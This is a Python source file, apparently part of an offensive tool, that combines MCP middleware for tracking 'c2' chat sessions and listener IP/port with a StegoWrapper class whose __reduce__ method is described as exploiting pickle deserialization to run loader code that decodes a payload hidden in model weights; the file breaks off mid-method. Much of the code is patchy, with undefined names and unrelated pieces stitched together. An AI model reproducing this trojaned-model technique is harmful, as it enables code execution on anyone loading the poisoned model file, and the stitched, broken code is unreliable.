import inspect

from transformers import AutoConfig, AutoModel, AutoTokenizer
from fastmcp import FastMCP, Client, Context as ClientContext
from fastmcp.dependencies import CurrentContext, CurrentFastMCP
from fastmcp.server.context import Context as ServerContext
from fastmcp.server.dependencies import get_server, get_http_request
from fastmcp.server.middleware import Middleware

from tools import decode_lsb

# Session context management for prompt persistence
class SessionContextManager(Middleware):
    """Manages conversation state per session using FastMCP middleware and state management."""
    
    def __init__(self, base_instructions: str, tokenizer=None):
        self.base_instructions = base_instructions
        self.tokenizer = tokenizer
        self.session_history = {}  # {session_id: [{"role": "user"/"assistant", "content": ...}]}
    
    def get_session_state_key(self, session_id: str) -> str:
        """Generate state key for a session."""
        return f"c2_context_{session_id}"

    def get_tokenizer(self, session_id: str) -> AutoTokenizer:
        """Retrieve tokenizer from middleware"""
        return self.tokenizer
    
    def initialize_session(self, session_id: str) -> None:
        """Initialize conversation history for a new session."""
        if session_id not in self.session_history:
            self.session_history[session_id] = []
    
    def add_user_command(self, session_id: str, prompt: str) -> None:
        """Add user command to session history."""
        self.initialize_session(session_id)
        self.session_history[session_id].append({
            "role": "user",
            "content": prompt
        })
    
    def add_agent_response(self, session_id: str, response: str) -> None:
        """Add agent response to session history."""
        self.initialize_session(session_id)
        self.session_history[session_id].append({
            "role": "assistant",
            "content": response
        })
    
    def get_session_history(self, session_id: str) -> list:
        """Retrieve conversation history for a session."""
        self.initialize_session(session_id)
        return self.session_history[session_id]
    
    def build_prompt_context(self, session_id: str, tokenizer=None) -> str:
        """Build complete prompt context (system + conversation history) for a session."""
        self.initialize_session(session_id)
        
        # Use provided tokenizer or fallback to instance tokenizer
        tok = tokenizer or self.tokenizer
        if not tok:
            raise ValueError("No tokenizer available for building prompt context")
        
        # Start with base system instructions
        messages = [
            {"role": "system", "content": self.base_instructions}
        ]
        
        # Add conversation history
        messages.extend(self.get_session_history(session_id))
        
        # Apply tokenizer template
        context = tok.apply_chat_template(
            messages,
            tokenize=False,
            add_generation_prompt=True
        )
        return context
    
    def clear_session(self, session_id: str) -> None:
        """Clear conversation history for a session."""
        if session_id in self.session_history:
            del self.session_history[session_id]
    
    async def on_request(self, context, call_next):
        """Middleware hook: Capture user commands and associate with sessions."""
        # Extract session ID from the FastMCP context
        session_id = None
        if hasattr(context, 'fastmcp_context') and context.fastmcp_context:
            session_id = getattr(context.fastmcp_context, 'session_id', None)
        
        # Extract user message/command from the request
        user_command = None
        if hasattr(context, 'request_body'):
            # Try to get content from the request body
            request_body = context.request_body
            if isinstance(request_body, dict):
                user_command = request_body.get('content') or request_body.get('message')
        elif hasattr(context, 'message'):
            user_command = context.message
        
        # Store the user command in session history if we have both session_id and command
        if session_id and user_command and isinstance(user_command, str) and user_command.strip():
            self.add_user_command(session_id, user_command)
        
        # Proceed with the request
        result = await call_next(context)
        return result
    
    async def on_response(self, context, call_next):
        """Middleware hook: Capture agent responses, output to console, and persist to session history."""
        # Proceed with the response first to get the result
        result = await call_next(context)
        
        # Extract session ID from the FastMCP context
        session_id = None
        if hasattr(context, 'fastmcp_context') and context.fastmcp_context:
            session_id = getattr(context.fastmcp_context, 'session_id', None)
        
        # Handle streaming responses (async generators)
        if hasattr(result, '__aiter__'):
            accumulated_response = []
            
            async def stream_and_output():
                """Stream response chunks to console while accumulating for storage."""
                async for chunk in result:
                    # Extract string content from chunk
                    chunk_str = None
                    if isinstance(chunk, str):
                        chunk_str = chunk
                    elif hasattr(chunk, 'content'):
                        chunk_str = chunk.content
                    elif isinstance(chunk, dict):
                        chunk_str = chunk.get('content') or chunk.get('message')
                    else:
                        chunk_str = str(chunk)
                    
                    # Output to console immediately
                    if chunk_str:
                        print(chunk_str, end='', flush=True)
                        accumulated_response.append(chunk_str)
                    
                    yield chunk
                
                # After streaming completes, store the full response
                response_text = ''.join(accumulated_response)
                if session_id and response_text and response_text.strip():
                    self.add_agent_response(session_id, response_text)
            
            # Return the streaming generator that outputs and captures
            return stream_and_output()
        
        # Handle non-streaming responses
        agent_response = None
        if isinstance(result, dict):
            agent_response = result.get('content') or result.get('response') or result.get('message')
        elif isinstance(result, str):
            agent_response = result
        elif hasattr(result, 'content'):
            agent_response = result.content
        
        # Output to console and store in session history
        if agent_response and isinstance(agent_response, str) and agent_response.strip():
            print(agent_response, flush=True)
            if session_id:
                self.add_agent_response(session_id, agent_response)
        
        return result

class SessionTracker(Middleware):
    async def on_initialize(self, ctx: MiddlewareContext, call_next):
        # Proceed with the initialization to let the server generate/confirm the session
        result = await call_next(ctx)
        
        # Access the session ID from the FastMCP context
        # ctx.fastmcp_context is available in the middleware context
        if ctx.fastmcp_context and ctx.fastmcp_context.session_id:
            session_id = ctx.fastmcp_context.session_id
            if session_id not in SESSIONS:
                SESSIONS.append(session_id)
        
        return result

class HFChatTemplatePreprocessor(Middleware):
    # model_id is passed as a parameter to the constructor
    def __init__(self, model_id: str):
        self.tokenizer = AutoTokenizer.from_pretrained(model_id, local_files_only=True)

    async def on_get_prompt(self, context: MiddlewareContext, call_next):
        result = await call_next(context)
        
        if hasattr(result, "messages"):
            formatted_chat = self.tokenizer.apply_chat_template(
                result.messages, 
                tokenize=True, 
                add_generation_prompt=True,
                return_tensors="pt"
            )
            # Update the result with the templated and tokenized string
            result.messages = formatted_chat
            
        return result

class ChatStateSaver(Middleware):
    async def on_request(self, context: MiddlewareContext, call_next):
        # Access the high-level FastMCP context
        mcp_ctx = context.fastmcp_context
        
        if mcp_ctx:
            await mcp_ctx.set_state("chat_session_id", "session_abc_123")
            await mcp_ctx.set_state("last_active", "2024-03-27T10:00:00Z")
        
        # Continue the middleware pipeline
        return await call_next(context)

class DynamicHostPortTracker(Middleware):
    def __init__(self, ip: str, port: str):
        """
        Middleware for tracking dynamically allocated IP addresses and listener ports
        """
        self.ip = ip
        self.port = port

    def get_ip(self):
        return self.ip

    def get_port(self):
        return self.port

class StegoWrapper(Middleware):
    """
    Wrapper for tensor steganography operations
    """

    def __init__(self, modified_state_dict: dict, target_key: str, num_lsb: int):
        """
        Initializes the wrapper, pickling the state_dict for embedding.
        """
        print(
            f"  [Wrapper Init] Received modified state_dict with {len(modified_state_dict)} keys."
        )
        print(f"  [Wrapper Init] Received target_key: '{target_key}'")
        print(f"  [Wrapper Init] Received num_lsb: {num_lsb}")

        if target_key not in modified_state_dict:
            raise ValueError(
                f"target_key '{target_key}' not found in the provided state_dict."
            )
        if not isinstance(modified_state_dict[target_key], torch.Tensor):
            raise TypeError(f"Value at target_key '{target_key}' is not a Tensor.")
        if modified_state_dict[target_key].dtype != torch.float32:
            raise TypeError(f"Tensor at target_key '{target_key}' is not float32.")
        if not 1 <= num_lsb <= 8:
            raise ValueError("num_lsb must be between 1 and 8.")

        try:
            self.pickled_state_dict_bytes = pickle.dumps(modified_state_dict)
            print(
                f"  [Wrapper Init] Successfully pickled state_dict for embedding ({len(self.pickled_state_dict_bytes)} bytes)."
            )
        except Exception as e:
            print(f"--- Error pickling state_dict ---")
            print(f"Error: {e}")
            raise RuntimeError(
                "Failed to pickle state_dict for embedding in wrapper."
            ) from e

        self.target_key = target_key
        self.num_lsb = num_lsb
        print(
            "  [Wrapper Init] Initialization complete. Wrapper is ready to be pickled."
        )

    def get_state_dict(self):
        try:
            return pickle.loads(self.pickled_state_dict_bytes)
        except Exception as e:
            print(f"Error deserializing internal state_dict: {e}")
            return None

    def __reduce__(self):
        """
        Exploits pickle deserialization to execute embedded loader code.
        """
        print(
            "\n[!] TrojanModelWrapper.__reduce__ activated (likely during pickling/saving process)!"
        )
        print("    Preparing loader code string...")

        # Embed the decode_lsb function source code
        # Note: here we're using inspect.getsource so we don't have to copy and paste
        decode_lsb_source = f"{inspect.getsource(decode_lsb)}"